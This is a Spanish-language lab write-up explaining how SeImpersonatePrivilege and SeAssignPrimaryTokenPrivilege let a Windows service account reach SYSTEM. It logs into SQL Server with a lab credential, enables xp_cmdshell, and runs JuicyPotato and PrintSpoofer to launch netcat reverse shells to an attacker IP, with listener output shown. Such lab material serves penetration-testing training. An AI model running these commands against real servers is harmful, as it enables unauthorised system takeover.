# SeImpersonate y SeAssignPrimaryToken

## Introducción

El sistema Windows representa la identidad de cuentas y procesos mediante **tokens de acceso**. Dos privilegios críticos relacionados con la reutilización o asignación de tokens son **SeImpersonatePrivilege** y **SeAssignPrimaryTokenPrivilege**. Ambos permiten a procesos con los derechos adecuados actuar con el contexto de otros usuarios y, si se abusan en entornos no endurecidos, posibilitan escaladas locales a NT AUTHORITY/SYSTEM.

---

## Definición

* **SeImpersonatePrivilege**: "Impersonate a client after authentication" — permite a un proceso (o hilo) **impersonar** a un cliente autenticado (usar su token de impersonación) para acceder a recursos en nombre de ese cliente. A menudo este privilegio se le otorga a cuentas administrativas. Un ejemplo del uso de este token es mediante la función [`CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

`Nota`: `CreateProcessWithTokenW` es una función de la API Win32 que crea un nuevo proceso y permite lanzarlo con la identidad de un token dado. Requiere que el llamador tenga `SeImpersonatePrivilege`.  

* **SeAssignPrimaryTokenPrivilege**: "Replace a process level token" — permite crear o asignar **tokens primarios** a procesos (por ejemplo, usar la función `CreateProcessAsUser`) y es más restrictivo.

Diferencia práctica:

* *Impersonation token* suele estar asociado a un thread y se usa para actuar temporalmente como el cliente.
* *Primary token* se asigna a un proceso entero y permite crear procesos enteros bajo esa identidad.

---

## Contexto de abuso

Windows permite, por diseño, que procesos reutilicen tokens de otros procesos para realizar tareas con distintos niveles de privilegio; esa funcionalidad legítima puede ser abusada si cuentas de servicio tienen derechos de impersonación, permitiendo a un atacante conseguir contexto SYSTEM mediante técnicas tipo Potato:

* Servicios que atienden conexiones de cliente (IIS, SQL Server, servicios RPC/COM) a menudo necesitan impersonar al usuario que realiza la petición para acceder a recursos (carpetas compartidas, bases de datos, otros servicios). Por ello, las cuentas de estos servicios a veces tienen `SeImpersonate` habilitado.
* Si se obtiene ejecución en el contexto de uno de esos servicios (por ejemplo, nt service/mssql$..., IIS APPPOOL/defaultapppool), la presencia de `SeImpersonate` o `SeAssignPrimaryToken` puede permitir una escalada rápida a SYSTEM.

Ataque tipo potato:
El atacante “engaña” a un componente que corre como SYSTEM para que inicie comunicación con el proceso del atacante; durante esa interacción se produce la oportunidad para que el atacante obtenga/usar el token SYSTEM.

Más información sobre los [ataques de suplantación de tokens](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

---

## SeImpersonate Example - JuicyPotato

### Contexto

En este ejemplo, hemos obtenido acceso inicial (foothold) en un servidor SQL (SQL Server) utilizando un usuario SQL privilegiado.
Tanto IIS como SQL Server pueden estar configurados para usar Windows Authentication, lo que significa que las conexiones de los clientes se realizan bajo el contexto de sus credenciales de Windows.

Cuando un servidor necesita acceder a otros recursos —por ejemplo, compartidos de red o archivos— en nombre del cliente que se conecta, puede hacerlo suplantando (impersonating) al usuario bajo cuyo contexto se estableció dicha conexión.

`Privilegio implicado`

Para poder realizar esta suplantación, la cuenta del servicio necesita tener asignado el privilegio [“Impersonate a client after authentication”](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) (también conocido como `SeImpersonatePrivilege`).

Este privilegio le permite al servicio asumir el token de seguridad de otro usuario autenticado y ejecutar acciones en su contexto, lo que es crucial para ataques como JuicyPotato, RoguePotato o PrintSpoofer, que explotan este permiso para obtener privilegios más altos (por ejemplo, NT AUTHORITY\SYSTEM).

Escenario de ejemplo

* El servicio de `SQL Server` está corriendo bajo el contexto de la cuenta por defecto:
  `mssqlserver`.
  

* Imaginemos que logramos ejecutar comandos como este usuario utilizando:
  `xp_cmdshell`.
  
  Este procedimiento almacenado de SQL permite ejecutar comandos del sistema desde SQL Server (por ejemplo, `whoami`, `dir`, etc.), lo cual representa un punto de ejecución remota de comandos (RCE).

* Supongamos además que hemos obtenido un conjunto de credenciales dentro de un archivo llamado `logins.sql` encontrado en un recurso compartido de red.

* Dicho archivo fue descubierto utilizando una herramienta como `Snaffler` que busca archivos y datos sensibles en redes Windows, como contraseñas, llaves o configuraciones con permisos inseguros.

---


### Conectando con MSSQLClient.py

**Contexto**

**Objetivo de esta etapa**

1. Validar que las credenciales proporcionadas son válidas.
2. Confirmar el tipo de autenticación utilizada (en este caso, autenticación integrada de Windows).
3. Verificar si el usuario tiene permisos elevados dentro de SQL Server (por ejemplo, acceso a `xp_cmdshell`).
4. Preparar el entorno para posibles técnicas de escalada de privilegios aprovechando configuraciones o permisos indebidos.

Con las credenciales `sql_dev:Str0ng_P@ssw0rd!`, primero nos conectamos a la instancia de `SQL Server` y verificamos los privilegios asociados a dicha cuenta. Esta fase nos permite determinar el nivel de acceso disponible dentro del servicio SQL, lo cual es crucial antes de intentar cualquier tipo de explotación o escalada.

Para realizar esta conexión, utilizamos la herramienta [**`mssqlclient.py`**](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) incluida en el paquete **Impacket**, una colección de utilidades para interactuar con diversos protocolos de red y servicios de Windows:


```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Al ejecutar este comando, el cliente intenta autenticarse contra el servicio MSSQL en la dirección IP del servidor utilizando autenticación de Windows (`-windows-auth`).



<img width="1355" height="515" alt="image" src="https://github.com/user-attachments/assets/523b730a-0a0e-48af-a0fd-2bd7a647cbe0" />


Esto indica que la conexión ha sido establecida correctamente y que ahora contamos con un **prompt interactivo de SQL**, desde el cual es posible ejecutar consultas y comandos.

---


### Habilitación de xp_cmdshell


Habilitamos el procedimiento almacenado `xp_cmdshell`, el cual permite ejecutar comandos del sistema operativo directamente desde el contexto de SQL Server. Esta capacidad es muy útil tanto para administradores legítimos como para un atacante que haya comprometido el servidor SQL.

Por defecto, esta funcionalidad suele estar deshabilitada por razones de seguridad, ya que representa un riesgo importante de ejecución remota de código (RCE) si la cuenta del servicio SQL tiene privilegios elevados.

Para habilitarla, utilizamos el shell de MSSQL proporcionado por **Impacket**, escribiendo el comando:

```
enable_xp_cmdshell
```

El script automáticamente ejecuta los siguientes pasos internamente:

* Habilita la opción de configuración avanzada de SQL (`show advanced options`).
* Activa `xp_cmdshell` dentro del servidor SQL.
* Ejecuta el comando `RECONFIGURE` de manera automática (no es necesario hacerlo manualmente).

La salida confirmará el cambio de configuración:

```
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
```

**Nota:** Impacket automatiza el proceso completo, por lo que no es necesario ejecutar manualmente los comandos `sp_configure` o `RECONFIGURE`.

---

### Confirmando acceso

Una vez habilitado `xp_cmdshell`, podemos verificar que efectivamente se están ejecutando comandos del sistema operativo en el contexto de la cuenta de servicio bajo la cual corre SQL Server.

Para ello, desde la consola SQL del cliente Impacket ejecutamos:

```
SQL> xp_cmdshell whoami
```

La salida será algo similar a:

```
nt service\mssql$sqlxpress01
```

Esto confirma que los comandos se están ejecutando con los privilegios del servicio **MSSQLSERVER**, lo cual es clave para los siguientes pasos de escalada de privilegios. Si dicha cuenta posee el privilegio **SeImpersonatePrivilege**, podremos aprovecharlo posteriormente para obtener un contexto de ejecución más elevado (por ejemplo, **NT AUTHORITY\SYSTEM**).

---

### Verificación de privilegios de la cuenta

**Descripción**

En este paso comprobamos qué privilegios tiene asignada la cuenta de servicio bajo la cual se ejecuta SQL Server. Esto es crucial para determinar si es posible realizar una escalada de privilegios.

Desde el shell de SQL (a través de Impacket) ejecutamos el siguiente comando:

```
SQL> xp_cmdshell whoami /priv
```

Esto permite listar los privilegios activos y deshabilitados del contexto actual del proceso. La salida muestra información similar a la siguiente:

```
PRIVILEGES INFORMATION

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```



El comando `whoami /priv` confirma que el privilegio **SeImpersonatePrivilege** se encuentra habilitado. Este privilegio permite **suplantar el contexto de un usuario autenticado** y ejecutar procesos en su nombre.

Este es un indicador claro de una posible escalada de privilegios, ya que [**JuicyPotato**](https://github.com/ohpe/juicy-potato) o herramientas similares pueden aprovechar **SeImpersonatePrivilege** o **SeAssignPrimaryTokenPrivilege** para obtener ejecución con el contexto de **NT AUTHORITY\SYSTEM** mediante técnicas de **DCOM/NTLM reflection abuse**.

`Nota`: `**DCOM/NTLM reflection abuse**`: El atacante “engaña” al sistema para que se autentique contra sí mismo y reutiliza (refleja) esa autenticación NTLM para obtener un token con privilegios más altos.

---


### Escalada de privilegios usando JuicyPotato


En este paso se aprovechan los privilegios `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` para escalar privilegios al nivel de **NT AUTHORITY\SYSTEM** utilizando la herramienta **JuicyPotato.exe**.

El procedimiento consiste en ejecutar JuicyPotato desde el contexto de la cuenta de servicio que posee dichos privilegios, forzando la suplantación de un token de sistema mediante el abuso del mecanismo de **reflexión DCOM/NTLM**.

---

**Procedimiento general**

1. Descargar los binarios necesarios:

   * `JuicyPotato.exe` (herramienta de explotación)
   * `nc.exe` (Netcat, para obtener una shell inversa)

2. Subir ambos archivos al servidor objetivo en una carpeta accesible, por ejemplo:
   `C:\tools\\JuicyPotato.exe` y `C:\tools\\nc.exe`

3. En el equipo atacante, iniciar un listener con Netcat en el puerto **8443**:

   ```
   nc -lnvp 8443
   ```

4. Desde la sesión SQL, ejecutar el siguiente comando mediante `xp_cmdshell`:

   ```
   SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
   ```

   Donde:

   * **-l** → Puerto del servidor COM que escucha (53375 en este caso).
   * **-p** → Programa a ejecutar (cmd.exe).
   * **-a** → Argumento pasado al programa (en este caso, la conexión reversa con Netcat).
   * **-t** → Indica los métodos de creación de proceso a probar:

     * `CreateProcessWithTokenW` (requiere `SeImpersonatePrivilege`)
     * `CreateProcessAsUser` (requiere `SeAssignPrimaryTokenPrivilege`)
   * **-e** → Ejecutar `cmd.exe` en la nueva conexión.

---

⚙️ Qué hace JuicyPotato por dentro



1. **Creación de un servidor COM falso**
   JuicyPotato crea localmente un servidor DCOM (Distributed Component Object Model) que simula ser un servicio legítimo. Este servidor queda a la espera de conexiones entrantes, normalmente en un puerto definido por el parámetro `-l`.

2. **Invocación de un objeto COM privilegiado**
   JuicyPotato utiliza un objeto COM registrado en el sistema (por ejemplo, `{4991d34b-80a1-4291-83b6-3328366b9097}`) que normalmente se ejecuta con el contexto de `NT AUTHORITY\\SYSTEM`. Al activar este objeto, Windows intenta establecer una conexión DCOM desde el servicio con contexto SYSTEM asociado a ese objeto hacia el servidor COM que controlamos.

3. **Autenticación NTLM del servicio SYSTEM**
   Durante esta conexión DCOM, el servicio bajo contexto SYSTEM se autentica mediante el protocolo `NTLM`, enviando un `desafío/respuesta` NTLM que demuestra su identidad privilegiada.

4. **Reflexión del desafío NTLM**
   JuicyPotato intercepta esta autenticación y la refleja (reenvía) de vuelta al mismo sistema local. En otras palabras, hace que Windows se autentique contra sí mismo.

   Al hacerlo, JuicyPotato obtiene un **token de seguridad** que representa la identidad de SYSTEM.

5. **Impersonación del token privilegiado**
   Gracias al privilegio `SeImpersonatePrivilege`, JuicyPotato puede adoptar ese token obtenido y actuar como si fuera SYSTEM.

6. **Creación de un nuevo proceso como SYSTEM**
   Una vez que JuicyPotato tiene el token de SYSTEM, utiliza funciones de Windows como:

   * `CreateProcessWithTokenW` (usa `SeImpersonatePrivilege`)
   * `CreateProcessAsUser` (usa `SeAssignPrimaryTokenPrivilege`)

   Estas llamadas crean un nuevo proceso bajo el contexto de SYSTEM. En el caso del laboratorio, el proceso lanzado es `cmd.exe` o `nc.exe` para establecer una shell con privilegios de SYSTEM.

---

**Diagrama del flujo lógico**

```
[1] Proceso actual (con SeImpersonatePrivilege)
        ↓
[2] Inicia servidor COM falso (JuicyPotato)
        ↓
[3] Invoca objeto DCOM privilegiado (SYSTEM)
        ↓
[4] SYSTEM se autentica vía NTLM → autenticación reflejada
        ↓
[5] JuicyPotato obtiene token SYSTEM
        ↓
[6] Crea proceso con CreateProcessWithTokenW → cmd.exe (SYSTEM)
```

---


**Salida esperada**

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```

Esto indica que la explotación fue exitosa y que se logró crear un proceso bajo el contexto de **NT AUTHORITY\SYSTEM**.

---

**Catching SYSTEM Shell**

En el listener del atacante se recibe la conexión inversa:

```
CyberWolfSec@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
WINLPE-SRV01
```

El comando `whoami` confirma la obtención de una shell con **privilegios de SYSTEM**, completando así la escalada de privilegios.

---

**Conclusión**

* JuicyPotato explota la reflexión DCOM/NTLM para obtener un token privilegiado.
* La cuenta con `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` puede suplantar al usuario SYSTEM.
* La explotación culmina con la obtención de una shell remota con privilegios máximos en el sistema comprometido.


---

---

---


🚀 Escalada de privilegios usando PrintSpoofer y RoguePotato

**Descripción general**

En versiones modernas de Windows (Windows Server 2019 y Windows 10 build 1809 en adelante), el método clásico de **JuicyPotato** ya no funciona debido a los parches aplicados por Microsoft que bloquean la reflexión NTLM local.

Sin embargo, herramientas más recientes como **PrintSpoofer** y **RoguePotato** permiten aprovechar los mismos privilegios (`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`) para obtener acceso con nivel **NT AUTHORITY\SYSTEM** mediante vectores distintos.

* **RoguePotato** utiliza un enfoque similar a JuicyPotato, pero emplea puertos HTTP/SMB y canales alternativos para evadir las restricciones locales.
* **PrintSpoofer**, en cambio, abusa del servicio de impresión de Windows (Spooler Service), que también se ejecuta como SYSTEM, para crear un token privilegiado y suplantarlo.

---

**Escalada de privilegios con PrintSpoofer**

En este ejemplo, usaremos **PrintSpoofer** para obtener una shell SYSTEM en el equipo víctima. La idea es idéntica: explotar `SeImpersonatePrivilege` para crear un proceso privilegiado, pero usando el canal del spooler en lugar de DCOM.

1. Nos conectamos nuevamente al servidor MSSQL utilizando **mssqlclient.py**.

2. Desde la consola SQL, ejecutamos **PrintSpoofer** con el argumento `-c` para definir el comando a ejecutar bajo el contexto de SYSTEM:

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Donde:

* `-c` → especifica el comando que se ejecutará con privilegios de SYSTEM.
* `nc.exe` → se usa nuevamente para crear una shell reversa.
* `-e cmd` → redirige la entrada/salida de `cmd.exe` a través de la conexión Netcat.

---

**Salida esperada**

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
```

Estos mensajes confirman que:

* La herramienta detectó el privilegio `SeImpersonatePrivilege`.
* Se estableció comunicación con el servicio de impresión (spooler).
* Se creó correctamente un proceso bajo el contexto de SYSTEM.

---

**Catching Reverse Shell as SYSTEM**

En el equipo atacante:

```
CyberWolfSec@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

La salida confirma que la conexión se estableció exitosamente y que ahora tenemos una shell interactiva con privilegios de **NT AUTHORITY\SYSTEM**.

---

**Conclusión**

* **JuicyPotato** fue mitigado en sistemas modernos, pero **PrintSpoofer** y **RoguePotato** ofrecen alternativas efectivas.
* Ambos explotan los mismos privilegios (`SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`).
* Es fundamental conocer varias técnicas de escalada, ya que su efectividad depende de la versión y configuración del sistema operativo objetivo.

```
Privilegios: SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
Vector: DCOM (JuicyPotato), RPC/Spooler (PrintSpoofer), SMB/HTTP (RoguePotato)
Resultado: NT AUTHORITY\SYSTEM
```
